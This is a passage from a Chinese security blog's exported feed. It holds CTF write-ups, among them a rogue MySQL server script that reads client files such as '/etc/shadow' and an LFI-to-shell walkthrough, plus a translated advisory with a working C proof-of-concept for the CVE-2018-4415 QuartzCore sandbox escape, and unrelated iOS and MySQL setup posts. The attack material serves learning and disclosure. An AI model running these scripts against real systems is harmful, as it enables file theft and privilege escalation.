'/etc/shadow',)#================================================#=======No need to change after this lines=======#================================================__author__ = 'Gifts'def daemonize(): import os, warnings if os.name != 'posix': warnings.warn('Cant create daemon on non-posix system') return if os.fork(): os._exit(0) os.setsid() if os.fork(): os._exit(0) os.umask(0o022) null=os.open('/dev/null', os.O_RDWR) for i in xrange(3): try: os.dup2(null, i) except OSError as e: if e.errno != 9: raise os.close(null)class LastPacket(Exception): passclass OutOfOrder(Exception): passclass mysql_packet(object): packet_header = struct.Struct('&lt;Hbb') packet_header_long = struct.Struct('&lt;Hbbb') def __init__(self, packet_type, payload): if isinstance(packet_type, mysql_packet): self.packet_num = packet_type.packet_num + 1 else: self.packet_num = packet_type self.payload = payload def __str__(self): payload_len = len(self.payload) if payload_len &lt; 65536: header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num) else: header = mysql_packet.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num) result = "&#123;0&#125;&#123;1&#125;".format( header, self.payload ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = ord(raw_data[0]) payload = raw_data[1:] return mysql_packet(packet_num, payload)class http_request_handler(asynchat.async_chat): def __init__(self, addr): asynchat.async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.state = 'LEN' self.sub_state = 'Auth' self.logined = False self.push( mysql_packet( 0, "".join(( '\x0a', # Protocol '5.6.28-0ubuntu0.14.04.1' + '\0', '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00', )) ) ) self.order = 1 self.states = ['LOGIN', 'CAPS', 'ANY'] def push(self, data): log.debug('Pushed: %r', data) data = str(data) asynchat.async_chat.push(self, data) def collect_incoming_data(self, data): log.debug('Data recved: %r', data) self.ibuffer.append(data) def found_terminator(self): data = "".join(self.ibuffer) self.ibuffer = [] if self.state == 'LEN': len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1 if len_bytes &lt; 65536: self.set_terminator(len_bytes) self.state = 'Data' else: self.state = 'MoreLength' elif self.state == 'MoreLength': if data[0] != '\0': self.push(None) self.close_when_done() else: self.state = 'Data' elif self.state == 'Data': packet = mysql_packet.parse(data) try: if self.order != packet.packet_num: raise OutOfOrder() else: # Fix ? self.order = packet.packet_num + 2 if packet.packet_num == 0: if packet.payload[0] == '\x03': log.info('Query') filename = random.choice(filelist) PACKET = mysql_packet( packet, '\xFB&#123;0&#125;'.format(filename) ) self.set_terminator(3) self.state = 'LEN' self.sub_state = 'File' self.push(PACKET) elif packet.payload[0] == '\x1b': log.info('SelectDB') self.push(mysql_packet( packet, '\xfe\x00\x00\x02\x00' )) raise LastPacket() elif packet.payload[0] in '\x02': self.push(mysql_packet( packet, '\0\0\0\x02\0\0\0' )) raise LastPacket() elif packet.payload == '\x00\x01': self.push(None) self.close_when_done() else: raise ValueError() else: if self.sub_state == 'File': log.info('-- result') log.info('Result: %r', data) if len(data) == 1: self.push( mysql_packet(packet, '\0\0\0\x02\0\0\0') ) raise LastPacket() else: self.set_terminator(3) self.state = 'LEN' self.order = packet.packet_num + 1 elif self.sub_state == 'Auth': self.push(mysql_packet( packet, '\0\0\0\x02\0\0\0' )) raise LastPacket() else: log.info('-- else') raise ValueError('Unknown packet') except LastPacket: log.info('Last packet') self.state = 'LEN' self.sub_state = None self.order = 0 self.set_terminator(3) except OutOfOrder: log.warning('Out of order') self.push(None) self.close_when_done() else: log.error('Unknown state') self.push('None') self.close_when_done()class mysql_listener(asyncore.dispatcher): def __init__(self, sock=None): asyncore.dispatcher.__init__(self, sock) if not sock: self.create_socket(socket.AF_INET, socket.SOCK_STREAM) self.set_reuse_addr() try: self.bind(('', PORT)) except socket.error: exit() self.listen(5) def handle_accept(self): pair = self.accept() if pair is not None: log.info('Conn from: %r', pair[1]) tmp = http_request_handler(pair)z = mysql_listener()# daemonize()asyncore.loop() 执行select * from users;即可读取到flag。 参考从一道ctf题学习mysql任意文件读取漏洞 0x03 Web - RefSpace打开题目url，发现其url经过跳转变为http://target_url/?route=app/index，查看源码发现其开启了错误回显。可以利用route参数结合伪协议读取源码。首先读取index.php和app/index.php，得知存在app/flag.php，在app/flag.php得知backup.zip的存在。通过检查robots.txt文件得知app/Up10aD.php文件的存在。最后得知存在目录/upload/。 index.php123456789101112&lt;?phperror_reporting(E_ALL);define('LFI', 'LFI');$lfi = $_GET['route'] ?? false;if (!$lfi) &#123; header("location: ?route=app/index"); exit();&#125;include "&#123;$lfi&#125;.php";//Good job, you know how to use LFI, don't you?//But You are still far from flag//hint: ?router=app/flag app/index.php12345678910111213141516171819202122&lt;?phpif (!defined('LFI')) &#123; echo "Include me!"; exit();&#125;?&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;body&gt; Hi CTFer,&lt;br /&gt; è¿æ¯ä¸ä¸ªéå¸¸éå¸¸ç®åçSDKæå¡ï¼å®çä»»å¡æ¯ç»åä½å¤§ä½¬&lt;!--é¼ --&gt;æä¾flag&lt;br /&gt; Powered by Aoisystem&lt;br /&gt; &lt;!-- error_reporting(E_ALL); --&gt; &lt;/body&gt;&lt;/html&gt; app/flag.php12345678910111213141516171819202122&lt;?phpif (!defined(&apos;LFI&apos;)) &#123; echo &quot;Include me!&quot;; exit();&#125;use interesting\FlagSDK;$sdk = new FlagSDK();$key = $_GET[&apos;key&apos;] ?? false;if (!$key) &#123; echo &quot;Please provide access key&lt;br \&gt;&quot;; echo &apos;$_GET[&quot;key&quot;];&apos;; exit();&#125;$flag = $sdk-&gt;verify($key);if ($flag) &#123; echo $flag;&#125; else &#123; echo &quot;Wrong Key&quot;; exit();&#125;//Do you want to know more about this SDK?//we &apos;accidentally&apos; save a backup.zip for more information app/Up10aD.php1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpif (!defined(&apos;LFI&apos;)) &#123; echo &quot;Include me!&quot;; exit();&#125;if (isset($_FILES[&quot;file&quot;])) &#123; $filename = $_FILES[&quot;file&quot;][&quot;name&quot;]; $fileext = &quot;.gif&quot;; switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123; case &apos;image/gif&apos;: $fileext = &quot;.gif&quot;; break; case &apos;image/jpeg&apos;: $fileext = &quot;.jpg&quot;; break; default: echo &quot;Only gif/jpg allowed&quot;; exit(); &#125; $dst = &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . $fileext; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst); echo &quot;æä»¶ä¿å­ä½ç½®: &#123;$dst&#125;&lt;br /&gt;&quot;;&#125;?&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt; æä»¬ä¸è½è®©éæè½»èæä¸¾çæç´¢å°ä¸ä¼ æ¥å£ã&lt;br /&gt; å³ä¾¿æ¯è¿æ°å¥½çäººç¢°å·§éå°äºï¼æç¸ä¿¡æä»¬çè¿æ»¤æ¯ä¸æ ä¸å¤±ç(ææª &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;æ¥éæ©ä½ çæä»¶å§:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; backup.zip1234567891011121314151617我们的SDK通过如下SHA1算法验证key是否正确:public function verify($key)&#123; if (sha1($key) === $this-&gt;getHash()) &#123; return &quot;too&#123;young-too-simple&#125;&quot;; &#125; return false;&#125;如果正确的话，我们的SDK会返回flag。PS: 为了节省各位大佬的时间，特注明 1.此处函数return值并不是真正的flag，和真正的flag没有关系。 2.此处调用的sha1函数为PHP语言内建的hash函数。(http://php.net/manual/zh/function.sha1.php) 3.您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。 4.几乎大部分源码内都有一定的hint，如果您是通过扫描目录发现本文件的，您可能还有很长的路要走。 flag.php中接受一个key参数作为变量$key的值，并作为参数传入$sdk-&gt;verify()中，在backup.zip中的内容可以看出，$key的值经过SHA1处理后与$sdk-&gt;getHash()比较，若一致则返回内容。Up10aD.php则是一个文件上传脚本，接收gif和jpg类型的文件，并拼接相应后缀后保存在upload目录中。这里可以通过上传zip文件，以zip://或者phar://伪协议的方法进行包含getshell。]]></content>
      <categories>
        <category>CTF</category>
        <category>赛后总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>赛后总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过QuartzCore堆溢出实现Safari沙箱逃逸]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F12%2F03%2F%E9%80%9A%E8%BF%87QuartzCore%E5%A0%86%E6%BA%A2%E5%87%BA%E5%AE%9E%E7%8E%B0Safari%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8</url>
    <content type="text"><![CDATA[转自SSD Advisory – iOS/macOS Safari Sandbox Escape via QuartzCore Heap Overflow 漏洞摘要QuratzCore，或者称之为CoreAnimation，是macOS和iOS用来创建动画图表的框架。CoreAnimation使用了一个独特的渲染模型，这个渲染模型的图像操作运行在一个独立的进程中。在macOS中，这个独立的进程是WindowServer，在iOS中，这个独立的进程是backboardd，他们都不在沙箱内，并且有权限执行setuid命令。作为服务，QuartzCore常被称作CARenderServer。它存在于macOS和iOS上，并且可以在Safari沙箱内被获取到，因此，他曾在多种场景下被用在Pwn2Own上。在最新版本macOS和iOS上的QuartzCore中存在着会导致堆溢出的整型溢出漏洞。 厂商回应“CoreAnimation Impact: An application may be able to execute arbitrary code with system privilegesDescription: A memory corruption issue was addressed with improved memory handling.CVE-2018-4415: Beyond Security’s SecuriTeam Secure Disclosure” CoreAnimation影响：应用有可能以系统权限执行任意代码。描述：内存崩溃的问题通过改进的内存处理被解决。CVE-2018-4415: Beyond Security’s SecuriTeam Secure Disclosure CVECVE-2018-4415 致谢将本漏洞报告给Beyond Security’s SecuriTeam Secure Disclosure项目的一位独立的安全研究员。 影响系统macOS 10.14iOS 12.10 漏洞细节漏洞产生的根本在于QuartzCore的CA::Render::InterpolatedFunction::InterpolatedFunction函数，这个函数没有考虑到整型溢出的情况。在接下来的内容中我们将讨论一下macOS和iOS上本漏洞的一些细节。 macOS 10.14在macOS上有一个追踪CARenderService非常好用的API，名为CGSCreateLayerContext（iOS上没有该API）。攻击者可以发送id为0x9C42或者0x9C43的消息给服务端口。当进程（事实上是server_thread)接收到这份特定id的消息时，它会进入到一种类似于反序列化的程序。如果提供了合适的数据，执行流会进入到函数CA::Render::InterpolatedFunction::InterpolatedFunction。 123456789101112131415161718192021222324252627282930313233343536__int64 __fastcall CA::Render::InterpolatedFunction::InterpolatedFunction(CA::Render::InterpolatedFunction *this, CA::Render::Decoder *a2)&#123; ... *((_DWORD *)this + 2) = 2; *((_DWORD *)this + 2) = 1; ++dword_2911E8; v2 = a2; *(_QWORD *)this = off_2652D8; *((_QWORD *)this + 2) = CA::Render::Decoder::decode_size_t(a2); // &lt;----- (b) *((_QWORD *)this + 6) = CA::Render::Decoder::decode_int32(a2); // &lt;----- (a) v3 = *((_QWORD *)this +2; if ( v3 &lt; 0) &#123; v5 = (*((_QWORD *)this + 2) &gt;&gt; 1) | *((_QWORD *)this + 2) &amp; 1LL; v4 = (float)(signed int)v5 + (float)(signed int)v5; &#125; else &#123; v4 = (float)(signed int)v3; &#125; *((float *)this +7) = v4 + -1.0; *((_QWORD *)this + 6) = 0LL; *((_QWORD *)this + 5) = 0LL; *((_QWORD *)this + 4) = 0LL; result = (unsigned int)CA::Render::Decoder::decode_int32(a2) &lt;&lt; 16; _InterlockedOr((volatile signed __int32 *)this +2, result); // &lt;----- (c) v7 = *((_QWORD *)this + 2); if ( v7 ) &#123; CA::Render:InterpolatedFunction::allocate_storage(this, (char *)result, v7); v8 = (void *)*((_QWORD *)this + 4); if ( v8 ) &#123; CA::Render::Decoder::decode_bytes(v2, v8, 4 * *((_QWORD *)this + 2) * *((unsigned int *)this + 6)); // &lt;----- (f) ... &#125; ... &#125; return result;&#125; 注意到在(a)和(b)两个位置，他们俩的值可以被攻击者控制（CA使用类似CA::Render::Decoder::decode* 的函数去反序列化对象），并且在CA::Render::InterpolatedFunction::allocate_storage函数中，这些值将被用于决定分配内存的大小。 1234567891011121314151617181920212223242526272829303132char *__usercall CA::Render::InterpolatedFunction::allocate_storage@&lt;rax&gt;(CA::Render::InterpolatedFunction *this@&lt;rdi&gt;, char *result@&lt;rax&gt;, __int64 a3@&lt;rsi&gt;)&#123; __int64 v3; // r14 __int64 v4; // t15 if ( a3 ) &#123; if ( !*((_QWORD *)this + 4) ) &#123; v3 = a3 * *((unsigned int *)this + 6); // &lt;----- (d) v4 = 0LL; if ( *((_QWORD *)this + 2) &amp; 0x20000 ) v4 = a3; // &lt;----- (e) result = (char *)malloc(4 * (v4 + v3)); *((_QWORD *)this + 4) = result; if ( v4 ) &#123; result += 4 * v3; *((_QWORD *)this + 5) = result; &#125; &#125; if ( !*((_QWORD *)this + 6) ) &#123; if ( *((_QWORD *)this + 2) &amp; 0x40000) &#123; result = (char *)malloc(32LL * *((_QWORD *)this + 2)); *((_QWORD *)this + 6) = result; &#125; &#125; &#125; return result;&#125; 在(d)处，v3可以被(a)和(b)处的值控制。由此(e)处的v4同样可以被攻击者控制。所以将要被分配的内存大小是4 * (v4 + v3)。但是仔细观察(f)处发现，传递给CA::Render::Decoder::decode_bytes的第三个参数实际为4 * v3。(f)处CA::Render::Decoder::decode_bytes最简单的形式类似memcpy(v2, v8, 4 * v3)或者memset(v2, 0, 4 * v3)。所以整型溢出导致的堆溢出发生在4 * (v4 + v3)溢出但4 * v3不溢出的时候。那些能够导致合适整型溢出的攻击者控制的值证据集均可在文末提供的漏洞利用中发现。 在macOS上复现： 12clang QuartzCoreFunctionIntOverFlow.c -o quartz_core_function_over_flow -framework CoreGraphics./quartz_core_function_over_flow 1234567891011121314151617181920212223242526272829303132331 Thread 0 Crashed:: Dispatch queue: com.apple.main−threadcom.apple.CoreFoundation 0x00007fff332e2daf __CFBasicHashAddValue + 2077com.apple.CoreFoundation 0x00007fff332e33f5 CFDictionarySetValue + 187com.apple.SkyLight 0x00007fff595ebfa9 CGXPostPortNotification + 123com.apple.SkyLight 0x00007fff595eb947 notify_handler + 73com.apple.SkyLight 0x00007fff595eb2d9 post_port_data + 237com.apple.SkyLight 0x00007fff595eafba run_one_server_pass + 949com.apple.SkyLight 0x00007fff595eab90 CGXRunOneServicesPass + 460com.apple.SkyLight 0x00007fff595eb820 server_loop + 96com.apple.SkyLight 0x00007fff595eb7b5 SLXServer + 1153WindowServer 0x000000010011d4c4 0x10011c000 + 5316libdyld.dylib 0x00007fff6036ced5 start + 1Thread 2:: com.apple.coreanimation.render−server // CARenderServer threadlibsystem_platform.dylib 0x00007fff6056ce09 _platform_bzero$VARIANT$Haswell+ 41com.apple.QuartzCore 0x00007fff3e8ebaa4 CA::Render::Decoder::decode_bytes(void*, unsigned long) + 46com.apple.QuartzCore 0x00007fff3e8c35f7 CA::Render::InterpolatedFunction::InterpolatedFunction(CA::Render::Decoder*) + 191com.apple.QuartzCore 0x00007fff3e8c3524 CA::Render::Function::decode(CA::Render::Decoder*) + 224com.apple.QuartzCore 0x00007fff3e8ecb8a CA::Render::Decoder::decode_object(CA::Render::Type) + 946com.apple.QuartzCore 0x00007fff3e8edc8e CA::Render::decode_commands(CA::Render::Decoder*) + 871com.apple.QuartzCore 0x00007fff3e896422 CA::Render::Server::ReceivedMessage::run_command_stream() + 748com.apple.QuartzCore 0x00007fff3e73d2e1 CA::Render::Server::server_thread(void*) + 1841com.apple.QuartzCore 0x00007fff3e91427c thread_fun(void*) + 25libsystem_pthread.dylib 0x00007fff60572795 _pthread_body + 159libsystem_pthread.dylib 0x00007fff605726e2 _pthread_start + 70libsystem_pthread.dylib 0x00007fff605722a9 thread_start + 13 iOS 12.10因为本问题产生的原因十分明显，并且macOS和iOS的代码基本上一样，在本部分中，我们只讨论iOS与MacOS不同的地方。 · macOS上并没有像CGSCreateLayerContext一样能够直接获取CoreAnimation渲染上下文的API，但是在探索中，我们发现MIG函数_XRegisterClient可以被用来代替CGSCreateLayerContext。首先，攻击者应该打开com.apple.CARenderServer服务（可以在沙箱内获取），然后通过ID为40202的mach_msg调用_XRegisterClient。· 为了在iOS 12 beta中复现本漏洞，你应该使用最新的1Xcode-beta（为了最新的SDK）。· 你应该根据www.malhal.com引入IOKit框架头。注意，目的目录应该更改为你的Xcode-beta应用。· 代码应该放在application didFinishLaunchingWithOptions函数中，这样当程序运行时就会触发执行。· 当程序被安装好之后，启动applicationios-sbe。 123456789101112131415161718192021221 Thread 3 name: com.apple.coreanimation.render−server // CARenderServer thread2 Thread 3:0 libsystem_platform.dylib 0x000000018fefe584 0x18fef6000 + 341801 QuartzCore 0x0000000194a6e1d4 0x19491e000 + 13767242 QuartzCore 0x0000000194a21a58 0x19491e000 + 10635123 QuartzCore 0x0000000194a710b8 0x19491e000 + 13887284 QuartzCore 0x0000000194a719c0 0x19491e000 + 13910405 QuartzCore 0x00000001949fb140 0x19491e000 + 9055366 QuartzCore 0x00000001949facdc 0x19491e000 + 9044127 QuartzCore 0x0000000194ab65c8 0x19491e000 + 16726488 libsystem_pthread.dylib 0x000000018ff0c26c 0x18ff01000 + 456769 libsystem_pthread.dylib 0x000000018ff0c1b0 0x18ff01000 + 4548810 libsystem_pthread.dylib 0x000000018ff0fd20 0x18ff01000 + 60704Thread 13 name: Dispatch queue: com.apple.libdispatch−managerThread 13 Crashed:0 libdispatch.dylib 0x000000018fd18514 0x18fcca000 + 3207881 libdispatch.dylib 0x000000018fd1606c 0x18fcca000 + 3114042 libdispatch.dylib 0x000000018fd1606c 0x18fcca000 + 3114043 libdispatch.dylib 0x000000018fd0f1ac 0x18fcca000 + 2830524 libsystem_pthread.dylib 0x000000018ff0d078 0x18ff01000 + 492725 libsystem_pthread.dylib 0x000000018ff0fd18 0x18ff01000 + 60696 Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130/** * Brief: Integer overflow in CoreAnimation, CVE-2018-4415 * Usage: * 1. clang FunctionIntOverFlow.c -o function_over_flow * 2. ./function_over_flow * * Specifically, `CA::Render::InterpolatedFunction::allocate_storage` function in QuartzCore does * not do any check for integer overflow in expression |result = (char *)malloc(4 * (v4 + v3));|. * * The bug has been fixed in macOS 10.14.1 and iOS 12.1, since the interfaces and structure of * messages are inconsistent between different versions, this PoC may only work on macOS 10.14 and * iOS 12.0, but it's very easy to replant it to another versions. * * Tips for debugging on macOS: Turn Mac to sleep mode and ssh to the target machine, this may * help you concentrate on your work. * * One more: Mach service com.apple.CARenderServer is reacheable from Safari sandbox on both macOS * and iOS. com.apple.windowserver.active accurately on macOS versions prior to macOS 10.14. */#include &lt;dlfcn.h&gt;#include &lt;mach/mach.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;static void do_int_overflow() &#123; mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL; task_get_bootstrap_port(mach_task_self(), &amp;bs_port); const char *render_service_name = "com.apple.CARenderServer"; kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, "bootstrap_look_up"); kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p); if (kr != KERN_SUCCESS) &#123; printf("[-] Cannot get service of %s, %s!\n", render_service_name, mach_error_string(kr)); return; &#125; typedef struct quartz_register_client_s quartz_register_client_t; struct quartz_register_client_s &#123; mach_msg_header_t header; uint32_t body; mach_msg_port_descriptor_t ports[4]; char padding[12]; &#125;; quartz_register_client_t msg_register; memset(&amp;msg_register, 0, sizeof(msg_register)); msg_register.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX; msg_register.header.msgh_remote_port = p; msg_register.header.msgh_local_port = mig_get_reply_port(); msg_register.header.msgh_id = 40202; // _XRegisterClient msg_register.body = 4; msg_register.ports[0].name = mach_task_self(); msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[1].name = mach_task_self(); msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[2].name = mach_task_self(); msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[3].name = mach_task_self(); msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR; kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG, sizeof(quartz_register_client_t), sizeof(quartz_register_client_t), msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) &#123; printf("[-] Send message failed: %s\n", mach_error_string(kr)); return; &#125; mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c); uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30); typedef struct quartz_function_int_overflow_s quartz_function_int_overflow_t; struct quartz_function_int_overflow_s &#123; mach_msg_header_t header; char msg_body[0x60]; &#125;; quartz_function_int_overflow_t function_int_overflow_msg = &#123;0&#125;; function_int_overflow_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX; function_int_overflow_msg.header.msgh_remote_port = context_port; function_int_overflow_msg.header.msgh_id = 40002; memset(function_int_overflow_msg.msg_body, 0x0, sizeof(function_int_overflow_msg.msg_body)); *(uint32_t *)(function_int_overflow_msg.msg_body + 0) = 0x1; // Ports count /** * 1. One port consumes 12B space * 2. This `mach_msg` routine dose not need a port, so set this port to MACH_PORT_NULL(memory * cleared by memset) */ *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 0) = 0xdeadbeef; *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 4) = conn_id; *(int8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16) = 2; *(uint64_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 1) = 0xdeadbeefdeadbeef; *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 9) = 0xffffffff; *(uint8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 13) = 0x12; // Decode Function *(uint8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 14) = 0x2; /**(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0xDECAFBAD;*/ *(uint64_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0x2000000000000000; *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 23) = 1; *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 27) = 2; *(uint8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 31) = 1; kr = mach_msg(&amp;function_int_overflow_msg.header, MACH_SEND_MSG, sizeof(function_int_overflow_msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) &#123; printf("[-] Send message failed: %s\n", mach_error_string(kr)); return; &#125; return;&#125;int main() &#123; do_int_overflow(); return 0;&#125;]]></content>
      <categories>
        <category>安全</category>
        <category>沙箱逃逸</category>
        <category>堆溢出</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>MacOS</tag>
        <tag>Safari</tag>
        <tag>堆溢出</tag>
        <tag>沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以Ad-Hoc方式发布iOS应用]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F11%2F28%2F%E4%BB%A5Ad-Hoc%E6%96%B9%E5%BC%8F%E5%8F%91%E5%B8%83iOS%E5%BA%94%E7%94%A8</url>
    <content type="text"><![CDATA[背景项目开发的App因为某些原因无法在AppStore上架，为了便于后续使用还是需要一种能够不经AppStore安装iOS App的手段。参照iOS部署参考，得知可以以Ad Hoc的方式发布iOS App。 0x00 准备· 一个支持https的网站，用来存放你的app以及相关文件· 一个等待发布的iOS项目 0x01 Apache服务器配置HTTPS我的服务器是搭建在阿里云上的，域名也是通过阿里云注册的。在阿里云的域名控制台的域名列表中选择要配置HTTPS的域名，进入其管理页面，点击免费开启SSL证书，根绝自己的需求选择开通证书的种类，经过验证后就可以等待审核了。审核通过后可以通过证书控制台按照服务器种类下载相应的证书。Apache服务器对应的证书文件下载下来有三个，xxxx_chain.crt、xxxx_public.crt、xxxx.key。 假设我们的服务器已经安装好了Apache，我们把下载到的证书文件全都拷贝到服务器上，创建一个目录来存放他们，我这里存放在/etc/httpd/conf/sss/目录下，这个目录开始不存在，是我自己创建的。 然后修改/etc/httpd/conf.d/ssl.conf文件： 取消下面两行配置的注释 12DocumentRoot &quot;/var/www/html&quot;ServerName www.example.com:443 根据我们获得的证书文件修改下面配置条目 123SSLCertificateFile /path/to/xxxx_public.crtSSLCertificateKeyFile /path/to/xxxx.keySSLCertificateChainFile /path/to/xxxx_chain.crt 重启httpd服务 1sudo service httpd restart 顺利的话使用https协议头访问域名应该没问题了。 0x02 应用发布 使用Xcode打开待发布的项目，选择 Product -&gt; Archive便开始归档。 归档后可以通过Window -&gt; Organizer查看已经归档的项目。 选中待发布的项目，点击Distribute按钮进入发布流程。 发布完成后将对应的ipa文件和manifest.plist文件放入之前配置的服务器的Web目录下。 创建download.html文件，写入内容： 1&lt;a href=&quot;itms-services://?action=download-manifest&amp;url=https://your.domainName/manifest.plist&quot;&gt;Install App&lt;/a&gt; 这样点击Install App便可以完成iOS App在手机上的安装了。]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>开发</tag>
        <tag>配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7.5 安装Mysql]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F11%2F26%2FCentOS-7-5-%E5%AE%89%E8%A3%85Mysql</url>
    <content type="text"><![CDATA[引自：https://www.linode.com/docs/databases/mysql/how-to-install-mysql-on-centos-7/ 0x00 准备· 安装wget 1sudo yum install -y wget 0x01 安装MySQL· 下载Repo 123wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpmsudo rpm -ivh mysql-community-release-el7-5.noarch.rpmsudo yum update · 安装MySQL，并启动MySQL服务。在安装过程中，yum会询问是否接受rpm的GPG认证，确认无误请输入y表示接受。 12sudo yum install mysql-serversudo systemctl start mysqld 0x02 加固MySQL服务器运行命令进入安全配置 1sudo mysql_secure_installation 依次出现： 1234567891011121314151617Enter current password for root (enter for none):如果之前没有设置过密码的话这里是空Set root password? [Y/n] Y接下来被询问是否设置root密码，选择&apos;Y&apos;并输入你的root密码。Remove anonymous users? [Y/n]询问是否移除匿名用户（MySQL默认的没有用户名密码就可以登录的用户），根据自己的需求选择，我选择了Y。Disallow root login remotely? [Y/n]是否禁止root用户远程登录，我选择了Y。Remove test database and access to it? [Y/n]是否移除测试数据库，我选择了Y。Reload privilege tables now? [Y/n]是否重新载入权限表。意味着应用刚才所做的一系列配置，我选择了Y。 0x03 创建数据库以及相应的MySQL用户· 创建数据库（这里用’demo’表示新建数据库） 1create database demo; · 创建用户并赋予demo数据库的所有权限 12create user &apos;usrname&apos;@&apos;localhost&apos; identified by &apos;pwd&apos;;grant all on demo.* to &apos;usrname&apos; identified by &apos;pwd&apos;;]]></content>
      <tags>
        <tag>MySQL</tag>
        <tag>CentOS</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MMDB build failed.]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F08%2F05%2FMMDB-build-failed</url>
    <content type="text"><![CDATA[MMDB build failed.实践苹果NetworkExtension过程中遇到的问题，需要向项目中导入NEKit，遵循NEKit给出的指导，用的是Carthage，但是执行carthage update --no-use-binaries --platform mac,ios过程中屡次失败，经查出错前最后的部分log如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291...... /bin/sh -c 